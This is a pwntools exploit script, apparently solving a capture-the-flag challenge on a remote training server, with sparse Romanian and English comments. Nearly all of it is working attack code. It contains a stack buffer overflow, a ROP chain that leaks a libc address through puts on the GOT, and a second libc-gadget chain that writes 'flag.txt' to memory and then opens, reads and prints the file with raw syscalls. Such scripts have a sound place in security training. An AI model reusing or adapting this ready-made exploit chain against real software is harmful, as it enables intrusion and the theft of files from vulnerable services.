from pwn import *
elf = ELF('./main')
p=elf.process()

cyberedu = '34.40.29.248:30946'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#avem doar read write open, flag.txt e chiar langa binary; 

#main
#pop rdi; rei
pop_rdi_ret = 0x401316
ret = 0x40101a
puts_plt = 0x401150
puts_got = elf.got['puts']
puts_offset = 0x80e50

vuln = 0x401566

#bss
flag_str = 0x04040c0
flag_buf = 0x404200   # past BSS, writable page

# get libc for gadgets;
p.recvuntil(b"?\n")
#v1
payload = b"A"*128
#rbp
payload += b"B"*8
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(ret)
payload += p64(vuln)

p.sendline(payload)
data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))
print(hex(val))

libc = val - puts_offset
print(f"Libc: {hex(libc)}")

#second gadget chain
p.recvuntil(b"?\n")
#v1
payload = b"A"*128
#rbp
payload += b"B"*8

#gadgets from libc
syscall = 0x29db4 + libc
syscall_ret = 0x91316 + libc
pop_rsi_ret = 0x2be51 +libc
pop_rdx_r12_ret = 0x011f357 + libc
mov_addr_rdx_rax_ret = 0x03a410 + libc
pop_rax_ret = 0x45eb0 + libc
pop_rcx_ret = 0x3d1ee + libc
pop_r8_mov_eax_1_ret = 0x165a56 + libc

#0x000000000005a272: mov rdi, rax; cmp rdx, rcx; jae 0x5a25c; mov rax, r8; ret; 
#yeah i know shut up
mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret = 0x5a272 + libc

#write to bss "flag.txt\0\0" to prepare for open
payload += p64(pop_rax_ret)
payload += p64(0x7478742e67616c66)   # "flag.txt"
payload += p64(pop_rdx_r12_ret)
payload += p64(flag_str)
payload += p64(0x0)
payload += p64(mov_addr_rdx_rax_ret)

# write null terminator (next 8 bytes = 0)
payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(pop_rdx_r12_ret)
payload += p64(flag_str + 8)
payload += p64(0x0)
payload += p64(mov_addr_rdx_rax_ret)           # [flag_str+8] = 0x00...

#open
# open("flag.txt", O_RDONLY) 
payload += p64(pop_rdi_ret)
payload += p64(flag_str)
payload += p64(pop_rsi_ret)
payload += p64(0)                     # O_RDONLY
payload += p64(pop_rax_ret)
payload += p64(2)                     # SYS_open
payload += p64(syscall_ret)
# rax = fd (unknown high number) 
#so now we need to store that fd;

#prepping for the weird gadget's conditions, so we dont jmp smwhere else
payload += p64(pop_rcx_ret)
payload += p64(0xffffffff)
payload += p64(pop_rdx_r12_ret)
payload += p64(0)
payload += p64(0)
#for now lets leave r8 alone;
# turns out it was ok, didnt even need to modify it
payload += p64(mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret)
#now rdi = fd

# just pop rax = 0 right after
payload += p64(pop_rax_ret)
payload += p64(0)                    # SYS_read


# now straight into read syscall
payload += p64(pop_rsi_ret)
payload += p64(flag_buf)
payload += p64(pop_rdx_r12_ret)
payload += p64(100)
payload += p64(0)
payload += p64(syscall_ret)          # read(fd, flag_buf, 100)

#now write
#  write(1, flag_buf, 100) 
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_ret)
payload += p64(flag_buf)
payload += p64(pop_rdx_r12_ret)
payload += p64(100)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(1)                     # SYS_write
payload += p64(syscall_ret)

p.sendline(payload)
p.interactive()
